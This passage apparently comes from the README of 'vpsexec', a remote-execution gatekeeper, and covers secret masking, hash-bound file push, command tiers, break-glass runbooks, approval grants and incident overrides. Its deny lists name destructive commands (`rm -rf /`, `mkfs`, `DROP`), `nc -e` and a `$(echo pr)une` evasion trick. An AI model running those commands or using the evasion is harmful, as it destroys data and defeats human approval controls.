statements; nginx `proxy_set_header Authorization …`; Vault kv-v1 reads. ANSI escapes,
zero-width and fullwidth characters are normalised first so they cannot split
a key from its value (escapes are therefore stripped from stored output).
`${VAR}` references stay readable; `tokenmint:v1.1.0` stays an image tag.

- **Compare still sees drift**: masked values carry an in-process HMAC tag
  (key drawn fresh per process, never stored) used only as `--compare`'s
  grouping key, so two hosts with different passwords land in different
  groups. The tag is never printed, journaled or sent — within one run a
  planted `password=<guess>` log line would share the real value's tag.
- **Fails closed**: a masker error, or output over 4 MB, is replaced by
  `<output withheld: …>`, never passed through. Narrow the read.
- **Over-masks on purpose**: `password_changed_at: 2024` comes out masked.
- **Old journal records** (written before masking) are masked on render by
  `vpsexec last` / `log` / `log --export --raw`. The journal is hash-chained
  and is not rewritten.
- **Does not** catch a bare secret with no context (a jsonpath printing only
  the base64). A leaked value is fixed by rotation, not by masking.

## Pushing a file

Operators used to `scp` files to hosts by hand, past both doors, and then
approve something like `install /tmp/diskwatch.new /usr/local/bin/diskwatch`. That
approval covers the command text, not the bytes: approved once, it installs
whatever sits at `/tmp/diskwatch.new` the next time it runs. `push` closes both
holes.

```
vpsexec <hosts> push <local-file> --sha256 <64-hex> --run --reason "why"
```

- **Content-addressed destination, never operator-chosen.** The file lands at
  `/var/tmp/vpscfg-push/<sha256>/<basename>`. Both directory levels are
  created `0700` and must be real directories owned by uid 0 with mode `700`,
  or the push refuses (`/var/tmp` is world-writable, so a pre-planted
  directory is refused, not trusted). The file is always `0600` root, whatever
  its local mode: the consuming `install -m ...` sets the final mode.
- **The gates see a canonical command**, `vpscfg-push <sha256> <basename>`.
  It is a mutation (never a read), so `--run`, `--reason`, posture, approval,
  the blackout advisory, map constraints, the repeat guard and
  journal-or-refuse all apply unchanged. The plan-hash covers it plus the
  push's hash, basename, size and path, so **an approval for one content
  cannot push another**. Typing the canonical string as an ordinary command
  is refused as reserved.
- **Frozen/lockdown hosts** need `--break-glass` and a committed runbook
  whose `cmd` is exactly the canonical string, i.e. it names the hash:

  ```yaml
  - hosts: [relay2]
    cmd: "vpscfg-push 3f1c...e9 diskwatch"      # the release binary's sha256
    where: host
    break_glass: true
    why: "stage diskwatch 0.8.0 for install"
  ```
- **Local checks, before any host is resolved or dialled:** the path must be
  a regular file (lstat and fstat on an `O_NOFOLLOW` descriptor; symlinks,
  directories, devices refused), at most 256 MiB, with a basename matching
  `[A-Za-z0-9._-]{1,64}` (not `.`/`..`, not starting with `-`), and its
  sha256 must equal `--sha256`. The file is read **once**; those bytes are
  hashed and those bytes are sent, so rewriting it while you read the plan
  changes nothing.
- **Deny sweeps still apply.** The floor and `deny_extra` run over the
  canonical string and the local path (so `push ~/.ssh/id_rsa` is refused by
  `policies/secrets.yaml`); the outer door sweeps the whole argv, reason
  included, as for any command.
- **Timeout:** the upload gets the per-host timeout plus about 1 s per MiB,
  capped at 30 minutes. Expiry is a transport failure (fails closed, lock
  retained, journaled).
- **Transport:** per host, under the usual lock: prepare and check the
  staging dir; if the final file already exists with the right hash, report
  `already present` and send nothing; otherwise stream the bytes to a temp
  name in the staging dir, `sha256sum` it remotely, and `mv -fT` it into
  place only on a match. A mismatch removes the temp and fails the host. Every
  push is journaled as a `push` event: host, sha256, basename, size, path,
  outcome (`pushed`, `already_present`, `hash_mismatch`, `staging_refused`,
  `upload_failed`, `rename_failed`, `refused`, `transport_error`).

### Content-addressed install

Install **from the hashed path, re-checking the hash in the same command**,
and give it a post-condition that fails on the wrong bytes:

```
vpsexec edge1 "echo '<sha>  /var/tmp/vpscfg-push/<sha>/diskwatch' | sha256sum --check --status \
  && install -m 0755 -o root -g root /var/tmp/vpscfg-push/<sha>/diskwatch /usr/local/bin/diskwatch" \
    --verify "echo '<sha>  /usr/local/bin/diskwatch' | sha256sum --check --status" \
    --run --reason "diskwatch canary: install release binary"
```

What this does and does not guarantee:

- The command text (so its plan-hash, and any runbook naming it) names the
  hash. An approval for it cannot be reused for a different build.
- **The path alone proves nothing about the bytes.** The staged file is
  root-only, but any root process on the host, or a later approved mutation
  on a `test` host, could rewrite it. That is why the install runs
  `sha256sum --check` first: if the staged file no longer has the hash, the
  install does not run.
- The `--verify` is a read (`echo … | sha256sum --check --status` classifies
  as tier read) and **exits non-zero** unless the installed file has the
  hash, which fails the host. Plain `sha256sum /usr/local/bin/diskwatch` is not a
  check: it exits 0 whatever it prints.
- Not covered: root on the host swapping the file between the check and
  `install(1)` in the same command. Content-addressing assumes root on the
  target is honest.

Never approve an install from a mutable path like `/tmp/diskwatch.new`.

### Not yet

- **No staging cleanup.** `/var/tmp/vpscfg-push/<sha>/` accumulates one
  directory per pushed content. A `push-gc` verb (or a runbook'd removal of
  one named hash directory) is a follow-up; until then, clean up by hand with
  the plan in front of you. A transport drop mid-push may also leave a
  `.<name>.part-*` temp there; it is never renamed into place without a
  matching hash.
- Push goes to hosts only (`--in*` is refused), one file per invocation.
- A compromised host can lie about `sha256sum`; content-addressing assumes
  root on the target is honest.

## Typed actions

A typed action is a declarative step from a closed vocabulary. In a runbook it
is written as `action:` plus `with:` instead of `cmd:`. On the command line it
is `vpsexec <hosts> --action NAME --with '{...}'`.

The door builds the body from reviewed code. It prints the body in full,
together with the action's "already done?" check. The plan-hash binds the
sha256 of both. The gates see the canonical string
`vpscfg-action <name>@<version> '<json>'`, and typing that string yourself is
refused as reserved, like `vpscfg-push`.

A mutation action is tier risky: it runs only where a runbook or a
non-break-glass override names it. An idempotent action whose check prints
`VPSCFG-DONE` reports `[done]` and runs nothing, so it needs no SKIP-DONE
phrase. A check that prints anything else fails the host closed.

Action policies live in `policies/actions/`. Older door copies glob only
`policies/*.yaml`, so a file there cannot lock them out; at the top level the
new loader refuses it.

A policy that contains action steps pins their expansion with a top-level
`expands:` digest. If the digest is missing or does not match, the file is
DISARMED, the same way a `shape:` mismatch disarms it. Lint prints the correct
line.

The full contract (parameter types, the check and idempotency rules, what is
journaled, and the vocabulary) is in [ACTIONS.md](ACTIONS.md).

## The three tiers

Classification runs on the whitespace-collapsed command and again on each
`;` / `&&` / `||` / `|` segment, so a benign head cannot shelter a payload.

| Tier | Examples | What it takes |
|---|---|---|
| **read** | `df -h`, `docker ps`, `systemctl status x`, `journalctl` | nothing — any host, no `--run`, like a probe |
| **mutating** | `./deploy.sh`, `make install`, anything unrecognised | `--run` + `--reason` + posture + approval |
| **risky** | `systemctl restart`, `docker rm`, `reboot`, `iptables` | the above **plus** a runbook or override naming it exactly, **for every host** |
| **(floor)** | `* prune`, `volume rm`, `DROP …`, `rm -rf /…`, `mkfs` | nothing. Ever. No flag, no file, no approval, no break-glass. |

**A familiar read tool refused for its flags gets a hint.** When a command is
a mutation only because a known read tool (curl, docker, systemctl, kubectl,
ls, …) was used in a form outside its read grammar, the tier detail — printed
in the plan, in a posture refusal, and in a refused check or verify — says
which form is accepted. `curl -fsS http://127.0.0.1/healthz` is a mutation
(curl is a read only when `-q` or `--disable` comes first, so `~/.curlrc` is
ignored), and its detail now ends with a hint naming that rule, the allowed
flags, and `curl -qfsS http://127.0.0.1/healthz` as the example. The hint is a message
only: it is computed after the tier is decided, nothing reads it back, and a
test pins that it changes no classification.

**Unknown commands are mutations, not reads.** The read tier is an allowlist —
`sed`, `awk`, `tar`, `rsync`, `mount`, `tee` and every shell are deliberately
*not* on it. Also never a read: `>` (redirection), `$` (expansion), or a
disqualifying flag (`find … -delete`, `curl -o`, `nc -e`).

**Command substitution is refused outright** — `$(…)`, backticks, `<(…)`.
`gates.py` documents `$(echo pr)une` as the limit of substring scanning; vpsexec
closes it by refusing the construct rather than pretending to scan it. Not
overridable: an authorisation names a literal, and substitution has no literal.

## The YAML policy framework

`policies/*.yaml`, in git, loaded on every invocation. **Non-recursive** — so
`policies/examples/` is inert.

**The asymmetry that makes it safe: a policy file can only ever make vpsexec
stricter.**

| A policy file CAN | A policy file CANNOT |
|---|---|
| name host groups | change any host's posture |
| add deny patterns (`deny_extra`) | remove a deny pattern |
| add risky patterns (`risky_extra`) | widen the read-only allowlist |
| authorise an exact command on exact hosts | lift the deny-always floor |

An **unknown top-level key is refused, not ignored** — a hopeful `allow_floor:`
fails loudly, and an older reader never silently skips a key a newer file needs.

Groups are validated against **both** the governor and `~/.ssh/config` at load
time. A group member you cannot reach is a typo you would otherwise discover
mid-incident. See `policies/README.md`.

## Break-glass

`web1`, `dns1`, `dns2` are frozen; `web2`, `web3` are lockdown. Mutating exec
normally works on `edge1` alone — which is exactly the wrong answer when the
estate is throwing 502s.

Break-glass resolves that **without putting a git commit in the incident path**,
and without making elevation improvisable:

```yaml
# policies/runbooks.yaml — written on a calm Tuesday, reviewed, committed
version: 1
expires: "2026-12-31"
reason: "Outage runbooks — incident response"
runbooks:
  - hosts: [web1.example.internal, web2, web3]
    cmd: "systemctl restart nginx"
    where: host
    break_glass: true
    why: "runbook 07 — wedged nginx worker pool"
```

```
$ vpsexec @docker 'systemctl restart nginx' --break-glass --run \
      --reason "INC-4471 502s estate-wide"

PLAN — 3 hosts: web1.example.internal, web2, web3
  tier    : risky (systemctl restart)
  order   : serial, continue on error
  BREAK-GLASS: 3 of 3 host(s) elevated past posture — ...
Type BREAK-GLASS:3 to approve, anything else aborts:
```

What break-glass reaches, and what it does not:

- it elevates **posture, per host, and only for hosts that need it** — a host
  already `test`/`released` is not elevated, and the journal records only the
  ones that were
- the **floor still refuses**, the **master switch** still applies, `mode:
  lockdown` still refuses, and the wrapper token is still required
- it needs `--break-glass` **and** a runbook with `break_glass: true` naming
  this exact command for **each** elevated host (and, for an entry with a
  `container:` key, exactly that container)
- an **ad-hoc `--override` file may not grant it** — `break_glass: true` there is
  refused outright. Elevation comes only from something committed and reviewed.
- it is journaled as its own `break_glass` event naming the runbook file

**Expiry.** Every file that defines runbooks needs `expires: "YYYY-MM-DD"`
(zero-padded; `2026-9-1` is refused because expiry is compared as text). The
file is live through that day. From the next day its runbooks are **disarmed**:
they authorise nothing, approval contracts over them stop working, and vpsexec
prints a `WARNING ... DISARMED` line on every run (`vpsexec runbooks` lists the
file too). Everything else keeps working, reads included; one lapsed file no
longer refuses the whole policy directory. Its `deny_extra`/`risky_extra` still
apply, and it is still validated, so retire it to
`policies/examples/superseded/` rather than leave it: a lapsed file naming a
host later removed from the governor would refuse the load again. A note
appears three days before a file lapses.

**Shape.** Every runbook file declares what its review approved, right after
`expires:`:

```yaml
shape: {steps: 6, hosts: [web1, worker2], break_glass: mixed}
```

`steps` is the number of runbook entries, `hosts` the set of host names they
name (as written: the loader does not collapse aliases, so respelling `web1` as
`web1.example.internal` is a change of shape), and `break_glass` is `true` if
every entry is break-glass, `false` if none is, `mixed` otherwise. All three
are required; an unknown or mistyped field, or a `shape` on a file with no
runbooks, refuses the whole load. A file whose runbooks do not match its shape,
or that defines runbooks with no `shape` at all (reason `no shape declared`),
is **disarmed exactly like a lapsed one**: still validated in full (tamper,
unknown keys and unknown hosts still refuse everything), its
`deny_extra`/`risky_extra`/groups/checks still apply, its runbooks authorise
nothing and cannot be granted, vpsexec prints `WARNING: policy X does not match
its declared shape (...) — its N runbook(s) are DISARMED` on every run, and
`vpsexec runbooks` lists it as `DISARMED (misshapen: ...)`. Every shipped file
that defines runbooks declares one; the test suite fails on a file that does
not, which replaces hand-maintained per-file counts in the tests.

Policy files are parsed with a loader that **refuses a duplicate key at any
depth**: plain YAML keeps the last of two equal keys, so a second `expires:` or
`shape:` lower in a file would otherwise silently replace the reviewed one. A
duplicate refuses the whole load, like any other malformed file. (Parsing is
still YAML 1.1, so `yes`/`no`/`on`/`off` are booleans.)

**Rollback steps.** Mark them `rollback: true` (the older spelling, `(rollback
only` in the `why`, still counts; saying `rollback: false` next to that text is
refused as ambiguous). Approval contracts exclude rollback steps unless
`--include-rollback` is given, and step-by-step runners should skip them.

The design goal: outage response is a **lookup, not an improvisation**.

## Approval

Nothing mutating runs without explicit, per-plan approval. The phrase scales
with what is at stake:

| Situation | Type |
|---|---|
| one host | the host name |
| several hosts | `FLEET:<n>` |
| `--in-all` | `ALL:<hosts>` |
| break-glass | `BREAK-GLASS:<n>` |

**Without a TTY** (cron, CI, an agent) it refuses, unless you pass
`--approve=<plan-hash>` from a prior dry run — **except for break-glass**.
Any process can pass `--approve`, so for a plan that elevates a host it
refuses on its own ("break-glass plans need your typed BREAK-GLASS phrase or
an approval contract; --approve alone no longer approves break-glass").
Break-glass takes the typed phrase, an approval contract, or `--approve`
**and** `--approval-contract` together — the hash must match and the contract
must pass every check of its own (controlling TTY included); that is journaled
as `plan-hash+approval-contract:<session_id>`. The plan-hash covers the host list
**and its order**, the command, placement, the resolved container set **on every
host**, the tier, break-glass, and the override digest. A container appearing on
any host invalidates it. `--approve` authorises one byte-identical plan — never
a session, never a host, never a time window.

There is no `--yes`. A blanket standing permission is the exact shape of the
near-miss this repo was built around.

**Typed-ahead keystrokes are discarded.** Immediately before the approval
prompt (and the canary `CONTINUE` prompt) vpsexec flushes pending terminal
input (`tcflush(TCIFLUSH)`), so a stray key pressed while the plan was printing
cannot become the answer and abort the step. Best-effort on non-terminals; it
never loosens the exact match.

## Approval contracts (`vpsexec grant`)

A long break-glass runbook meant typing `BREAK-GLASS:<n>` at every step — 40
times for a 40-step runbook — and every repetition is a chance for a mistyped
key, which makes it the riskiest part of the job. An approval contract (a
"grant") is approved **once**, for **one reviewed runbook**, for a **bounded
window**, and then replaces the typed phrase for the
steps it lists. It replaces **only** the phrase: the floor, `deny_extra`, map
constraints, posture / master switch / lockdown, runbook matching, `--reason`,
verify and journal-or-refuse all run unchanged on every use.

### The 1-2 command deploy

```
# Once, in your terminal (TTY; type REUSABLE-GRANT:shop-deploy:12h):
vpsexec grant new shop-deploy --kind reusable --ttl 12h --run

# Then, as often as the window and its uses allow — no path to paste:
vpsrun plays/shop-deploy.yaml
vpsexec web1 '<a break-glass step>' --break-glass --grant auto --run --reason "deploy"
```

`vpsrun` finds the grant itself; plain `vpsexec` does only when asked with
`--grant auto` (see **Auto-pick** below). Both print which one they chose
(kind, id, approval code) and journal it.

### Two kinds

| | `short` (default) | `reusable` |
|---|---|---|
| id | `st_<32 hex>` (a version-1 grant's bare hex id is short too) | `ru_<32 hex>` |
| binds | ONE runbook file, by the sha256 of its bytes, and the exact steps listed | a SCOPE: one or more policy files **and their pushed history** (the `policy_remote` URL, the fetched commit and each file's blob there at mint), a host set, a max-uses count, and optionally one release (`--for-release`) |
| a runbook edit | kills it | a **pushed** edit survives (each use matches the file as it reads then); an uncommitted or unpushed edit, a URL change or a rewritten remote refuses |
| network | never | fetches `policy_remote` at mint and every use; refuses offline |
| covers | the listed `break_glass: true` steps | every `break_glass: true` step of the scoped files, at each use |
| rollback steps | only with `--include-rollback` | only with `--include-rollback` |
| TTL | `15m 30m 1h 3h 6h 12h 24h` | `1h 3h 6h 12h 24h 72h 7d` |
| uses | unlimited within the window | `--max-uses N`, 1-500, default 50 |
| mint phrase | `GRANT:<runbook>:<ttl>` | `REUSABLE-GRANT:<policy>[+<policy>]:<ttl>` |

Both: capped by the policy's own `expires`; TTY at mint AND at every use;
HMAC-sealed; 0600 file in a 0700 dir; revocable; shown by `grant list` /
`grant show` with their kind. The kind is a sealed field and also the id's
prefix — a grant whose two disagree refuses. There is no agent (no-TTY) kind.

**A reusable grant at use.** All of the short checks that do not depend on a
step list run unchanged (file/dir modes, MAC, expiry, issued-at skew, TTL,
revocation, TTY). Then: every scoped file must be loaded, unexpired and match
its declared `shape` *right now* (a lapsed or misshapen file refuses the
grant); and every scoped file must be **pushed** (below) — so an edit
reaches a reusable grant only through the shared remote, and no git, no
repository, no remote, no network or a rewritten remote refuses (fail
closed). A grant minted before this binding refuses as malformed: mint a new
one.

### Reusable grants are bound to pushed policy

The governor names the remote branch: `"policy_remote": {"name": "origin",
"ref": "main"}` (that is the default; validated with the governor — plain
names only). At mint the grant is BOUND to the policy repository's raw
`remote.<name>.url`; at mint AND at every use the door fetches that branch
of the BOUND URL into a private scratch repository (below):

- at mint it records the bound URL, the fetched commit, and each scope
  file's blob there, which must be exactly the bytes the policy loader read;
- at use the repository's `remote.<name>.url` must still be the bound one,
  the bound URL is what is fetched, the fetched branch must still descend from
  the minted commit (a force-push or rewrite refuses), and each file's loaded
  bytes must be the minted blob or a version pushed to that branch since the
  minted commit (one you have not pulled yet still counts; an older or
  local-only version does not).

An uncommitted edit, a commit that exists only locally, an estate replaced by
a clone with a local commit, a changed remote URL, a fetch failure, no
network and a missing remote all refuse. **Short grants and incidents never
fetch** and keep working offline.

How it is proven: the door re-reads each scope file, requires its sha256 to
be the one the policy loader recorded (the bytes the policy was built from),
computes those bytes' git blob id itself, and compares it with the blob at
the fetched remote commit (`ls-tree` must show a plain `100644` file). It never
asks git's index or `git status`. The file must also be reached without a
single symlink between its repository's worktree top and itself, resolve
inside that worktree, and live in the same repository worktree the grant was
minted in (`scope.git.toplevel`).

**What the fetch trusts, exactly.** The fetch never runs in the policy
repository: it runs in a private scratch bare repository (0700, created per
call with `mkdtemp`, removed afterwards whatever happens) whose config is
git's clean default, and it fetches the bound URL itself, not a remote name.
So the policy repository's own `.git/config` — `url.<x>.insteadOf`,
`protocol.*.allow`, `core.sshCommand`, credential helpers, `uploadpack` —
is **never** read by a network call. Repository-local config is never
trusted. Your own **global** (and system) git config IS trusted, because the
fetch needs your credentials (osxkeychain, a credential helper, ssh via
`SSH_AUTH_SOCK`); it is the same account that holds the grant key. Even so:

- the URL must be `https://` or ssh (`ssh://` or `user@host:path`) — git://,
  http://, `ext::`, `file://` and local paths refuse;
- the effective URL (`git ls-remote --get-url <bound url>`, in the fetch's own
  environment, so your global `insteadOf` applies) must equal the bound URL —
  a global rewrite refuses;
- the command line pins, over any config: `protocol.allow=never` with only
  `protocol.https.allow=always` and `protocol.ssh.allow=always`,
  `core.sshCommand=/usr/bin/ssh`, `core.fsmonitor=false`,
  `core.hooksPath=/dev/null`, `submodule.recurse=false`, `--no-tags
  --no-recurse-submodules`, `PATH=/usr/bin:/bin`, `GIT_TERMINAL_PROMPT=0` (no
  credentials = refusal, never a prompt), and a 20 s timeout.

Everything read from the fetch (`rev-parse`, `cat-file`, `ls-tree`,
`rev-list`, `merge-base`) runs with the hardened git below, in the scratch
repository. A same-user process that edits your global config can still
steer or steal your credentials — your own account is trusted, as it is for
the grant key.

**Outage note.** Reusable grants need the remote (GitHub). When it is
unreachable, use a short grant or an incident — neither fetches.
git itself is pinned (`vpscfg/gitcmd.py`): the first of `/usr/bin/git`,
`/bin/git`, `/usr/local/bin/git`, `/opt/homebrew/bin/git` that is a regular
file owned by root, in directories that are all root-owned and not
group/other-writable up to `/` — never PATH, never a user-owned Homebrew git —
run from `/` with
`PATH=/usr/bin:/bin LC_ALL=C HOME=/nonexistent GIT_CONFIG_NOSYSTEM=1
GIT_CONFIG_GLOBAL=/dev/null` and `-c core.fsmonitor=false`, so no
environment variable, global config or repository hook answers for it. The
host-index cache check (`indexstore`) uses the same pinned git.

**Pushed is not reviewed** — unless the remote branch is protected. Anyone
who can push to the branch (or a process holding your credentials) gets an
edit covered. The binding proves an edit is on the shared remote — visible,
attributable, revertable — not that a human approved it. **Enable branch
protection on the policy branch with required pull-request review**; then a
covered edit is a reviewed one.
The planned hosts must be inside the grant's host set; and the
planned command and placement must equal a `break_glass: true` entry of a
scoped file that reaches those hosts (container rule as for short). A
non-break-glass entry is never covered; a rollback entry only if the grant
was minted with `--include-rollback`.

**Its use count.** Every successful use appends a line to
`~/.vpscfg/grants/<id>.uses` (0600, appended under an exclusive lock after
every other check passed) and is journaled as `grant_used` with
`use`/`max_uses`. The count is the HIGHER of the ledger and the journal's
`grant_used` events for that id, so deleting either one alone does not reset
it, and a grant used from another checkout (with its own journal) is still
counted by the shared ledger. A journal whose hash chain does not verify, or
a ledger that is not a private regular file of valid lines for that id,
refuses the grant (fail closed). At `max_uses` it refuses and `grant list`
shows it `SPENT`. Nothing — no verb, flag or file — extends, widens or
resets a grant; mint a new one.

```
vpsexec grant new shop-deploy --kind reusable --ttl 12h              # plan only
vpsexec grant new shop-deploy --kind reusable --ttl 12h --run        # mint
vpsexec grant new shop-deploy,shop-db --kind reusable --ttl 3h \
    --hosts web1 --max-uses 10 --run                                 # narrower
```

### Auto-pick

Plain `vpsexec` spends a grant only when you ask: `--grant auto` (or
`--approval-contract=auto`), or `--grant FILE`. With no flag on a break-glass
plan it LISTS the valid covering grants (vpsrun reads that list when it plans
a play or release) and then asks for the typed phrase; `--no-grant` lists
nothing. `vpsrun` keeps auto-pick for plays and releases. With `--grant auto`
vpsexec searches `~/.vpscfg/grants` for grants that are VALID (every check
above, plus a use left for a reusable one) and cover that exact plan, leaving
out any grant minted `--for-release` (only that release spends it; naming the
file yourself is deliberate and allowed). It picks:

1. the narrower kind first (short before reusable);
2. within a kind, the soonest-expiring;
3. on a tie, the lowest session id — and says that it broke a tie.

It prints `grant   : auto-picked <kind> <id> code <code>`, journals
`grant_autopicked`, and then uses that grant exactly as if you had named it
(full check again, TTY, count). An invalid, expired, revoked, spent or
non-covering grant is skipped, never chosen. A grants directory that exists
but is not private (0700, yours) refuses instead of being skipped.

`--grant auto` works for **any** mutation (a grant can stand in for a
non-elevated listed step too) and **refuses** if nothing covers it — a
contract flag never falls back to prompting. A file literally named `auto` is
`./auto`. `--grant FILE` is the same as `--approval-contract=FILE`; a refused
contract's message names the flag you typed. In plan mode (no `--run`) the
plan lists the valid grants under `grants  :`, in order, with
` release <name>` after one bound to a release; nothing is counted or
journaled there.

### Short grants, step by step

```
# 1. See exactly what it would authorise (writes nothing)
vpsexec grant new shop-wave5-deploy --ttl 3h [--steps 1-20,23,25-30] [--hosts web1]

# 2. Mint it: TTY only, type GRANT:shop-wave5-deploy:3h
vpsexec grant new shop-wave5-deploy --ttl 3h --run
#    MINTED ~/.vpscfg/grants/st_<32 hex>.json   code ABCD-EFGH-JK23

# 3. Use it for each step, in a real terminal — auto-picked, no path needed
vpsexec web1 '<step cmd>' --break-glass --run --reason "wave5"
#    or name it: --approval-contract=~/.vpscfg/grants/<session_id>.json
#    both spellings work: `--approval-contract FILE` (the shell expands ~) and
#    `--approval-contract=~/...` (vpsexec expands ~ itself). An empty value refuses.

vpsexec grant list                 # ACTIVE / EXPIRED / SPENT / REVOKED / INVALID, with kind
vpsexec grant show <file>          # VALID, or INVALID and why (uses for reusable)
vpsexec grant revoke <session_id>  # TTY; type REVOKE:<short id>. Permanent.
#    short id = st_/ru_ plus the first 8 hex (just 8 hex for a version-1 grant)
```

What a grant covers:

- **One runbook file**, bound by the sha256 of its bytes. Editing the runbook
  (even a comment) invalidates every grant over it.
- **Only `break_glass: true` entries** from a loaded, unexpired policy file
  that matches its declared `shape`.
  The plan (`grant new` without `--run`) also lists every step it leaves out
  and why: a step that classifies as a **read** shows as `read: runs without a
  grant` (it needs no approval, so a grant adds nothing, and it never becomes
  a grant step; naming one in `--steps` leaves it out rather than refusing);
  a non-break-glass mutation shows as `not break_glass` (naming one in
  `--steps` still refuses); an excluded rollback step says so.
  Rollback steps (`rollback: true`, or a `why` containing `(rollback only`)
  are **excluded** unless you pass `--include-rollback`. `--steps` uses the runbook's entry numbers (1-based,
  file order). `--hosts` narrows the hosts.
- **TTL** is exactly one of `15m 30m 1h 3h 6h 12h 24h`, and a grant may not
  outlive the runbook policy's own `expires`.
- At use, the planned command (normalised as vpsexec matches it) and placement
  must equal a listed step that still exists in the loaded runbook with
  `break_glass: true`; the planned hosts must be within the grant's hosts and
  that runbook entry's hosts; and if that entry names a `container`, the plan
  must target exactly that container on every host.
- **A listed step that needs no elevation.** When every host of the plan is
  already `test`/`released` (a `break_glass: true` step on such hosts, or a
  host whose posture was relaxed after the grant was minted), nothing is
  elevated and the contract stands in for the step's ordinary typed phrase.
  The plan is a normal mutation — `break_glass` false in its hash, no
  `break_glass` journal event — and every gate (reason, risky authorisation,
  posture, master switch, mode, map, verify) has already run. The use is
  journaled as `grant_used` with `elevated: false`. The contract is still
  refused for any step, command, placement, container or host it does not
  list, and `--approve` with `--approval-contract` on such a plan still
  refuses as two approvals.

The file (`~/.vpscfg/grants/<session_id>.json`, 0600, dir 0700) is JSON with a
fixed key set per version and kind. Version 1 (still accepted, always short):
`version, session_id` (128-bit CSPRNG hex), `approval_code` (3×4 base32,
CSPRNG — printed and journaled on every use so a human can correlate),
`operator, issued_at, expires_at` (UTC), `ttl, runbook {file, sha256}, hosts,
steps [{index, why, where, cmd, cmd_sha256}], options {break_glass,
include_rollback}, mac`. Version 2 (what `grant new` writes) adds `kind`; a
short v2 grant has the v1 keys plus `kind: "short"` and an `st_` id; a
reusable one has `version, kind, session_id` (`ru_` + the same 128-bit hex),
`approval_code, operator, issued_at, expires_at, ttl, scope {files}, hosts,
max_uses, options, mac`. A v1 grant carrying `kind`, a v2 grant with a bare
id, or an id prefix that disagrees with `kind` refuses. `mac` is HMAC-SHA256
over the canonical JSON of every other field, keyed by `~/.vpscfg/grant.key`
(32 random bytes, created 0600 on first mint; a key that is not 0600 or not
yours is refused). The previous release's door refuses version-2 grants
(fail closed): mint with the door you will use them with.

At use, all must hold or it **refuses — it never falls back to the prompt**
(drop the flag to type the phrase instead): ≤ 256 KiB; file and directory owned
by you and not group/world accessible; valid JSON, no duplicate keys; version
1; exact key sets; MAC valid (constant-time compare); not expired; `issued_at`
not more than 60 s in the future; TTL allowed and equal to `expires_at -
issued_at`; not revoked (a revocations file that cannot be trusted fails
closed); runbook sha256 unchanged; command, placement and hosts as above;
stdin is this process's **controlling terminal and in its foreground process
group** — `isatty()` alone is not enough, because a process with no terminal
can redirect `< /dev/ttysNNN` (your own tty) and pass it (checked with
`/dev/tty` and `tcgetpgrp()`, which fails on any tty that is not the caller's
controlling one); `--approve`, if also given, matches this plan. Grant, key and
revocations files are opened `O_NOFOLLOW|O_NONBLOCK` and must be regular files
(a FIFO refuses instead of hanging). The grant directory comes from the password
database, not `$HOME`, so `HOME=/tmp/x` with a copied key cannot find an empty
revocations file.

Journal (`vpsexec.jsonl`): `grant_minted` (with kind), `grant_used` (kind,
session_id, approval_code, runbook file, step index, plan-hash; `use` and
`max_uses` for reusable), `grant_autopicked` (kind, session_id, code,
plan-hash, candidate and tie counts), `grant_refused` (reason),
`grant_revoked`; vpsrun's `play_approved` carries the auto-picked grant. The
key and the MAC are never printed or journaled.

What it protects against: a tampered, hand-edited or wrong-key grant; a stale
grant after the runbook changed; expired or revoked grants; scope creep to
another command, host or runbook; unattended use (TTY required); other local
users reading or planting grants; accidental keystrokes. What it does **not**:
a process running as you can read `grant.key` and forge a grant, and can
allocate a pty — the TTY check is the same barrier the typed phrase is today,
not a stronger one; root on the workstation; a stolen, unexpired grant used
from your own terminal; a same-user process deleting the revocations file, or
deleting both a reusable grant's ledger and the journal; a reviewed, committed
edit that adds a break-glass step to a file a live reusable grant scopes (that
is what the kind is for — keep its TTL short and its scope narrow). The full
note is the `Threats:` docstring of `vpscfg/vpsexecgrant.py`.

## Incident override (`vpsexec incident`)

Break-glass is a lookup: the runbook is written and reviewed before the
outage. When the outage is one nobody wrote a runbook for, waiting hours for a
reviewed entry means a customer stays down, or someone reaches for raw ssh and
leaves every gate behind. An incident is the sanctioned middle: loud,
time-boxed, host-scoped, opened by a human at a terminal.

```
# 1. Open it: TTY only, pending keystrokes are flushed, type INCIDENT:web1,dns1:1h
vpsexec incident open --hosts web1,dns1 --ttl 1h --reason "OUTAGE-123 checkout 502s"
#    OPENED ~/.vpscfg/grants/ic_<32 hex>
#    INCIDENT ic_... OPEN — expires in 60 min (...) — hosts: web1, dns1

# 2. Work: each command still takes --run, --reason and a typed GO:<host>
vpsexec web1 'systemctl restart redis' --break-glass --incident ic_... \
    --run --reason "OUTAGE-123 redis wedged"          # type GO:web1

# 3. See what is open
vpsexec incident status

# 4. Close it when the outage is over: TTY only, type CLOSE:ic_<first 8 hex>
vpsexec incident close ic_...
#    prints every command run under it, writes journal/incidents/ic_....md
```

What it lifts: **only the runbook lookup** — the risky-tier authorisation and
the "committed break_glass runbook naming this exact command" check — for the
hosts the incident lists. A frozen host still needs `--break-glass` (both doors
check it; under `--incident` the posture refusal says exactly that, and without
one it points at `vpsexec incident open`), and that is all the incident changes.

What it does not lift: the deny-always floor, `deny_extra` (including
`policies/secrets.yaml`), the directory map (a map with `forbid_break_glass`
refuses `--incident` too), the master switch and lockdown mode, container
resolution, `--reason`, journal-or-refuse, the per-host lock, verify, and secret
masking. Reads are unchanged and refuse the flag (a read needs no incident).

Rules:

- **Hosts by name.** No `@group`, no `@all`, no `all`, no glob. Every name must
  be a governed host; aliases resolve to their canonical name, and the typed
  phrase uses the canonical list.
- **TTL** is one of `15m`, `30m`, `1h`, `2h`, `4h`. There is no extend: opening a
  new incident is the extension, with its own phrase and journal entry.
- **A plan with one unlisted host refuses whole.** An incident never applies to
  a host it does not list.
- **Approval is `GO:<host>`** (several hosts: `GO:<first 6 of the plan-hash>`),
  typed at the controlling terminal, after the plan and the banner. A bare
  `GO` does not approve: the phrase names what it runs on, so a reflexive
  answer cannot approve the wrong command. The incident is checked again after
  you type it: if it expired or was closed while the prompt waited, nothing
  runs. `--approve`, `--approval-contract` and `--grant` are refused alongside
  `--incident`, and it never lists or picks a grant; there is no unattended path.
- **Close** is `CLOSE:ic_<first 8 hex>` — the short id, as for grants.
- **Banner.** Every plan and every result prints
  `INCIDENT <id> OPEN — expires in N min — hosts: ...`, and the plan shows an
  `INCIDENT:` line. The incident id is part of the plan-hash.
- **Expiry and close end it.** An expired file refuses; a closed id is recorded
  in `~/.vpscfg/grants/incidents-closed.jsonl` and refuses forever. A closed list
  that exists but cannot be parsed or is not private fails closed.

The file is `ic_<128-bit hex>`, 0600, in the grants directory (no `.json`, so
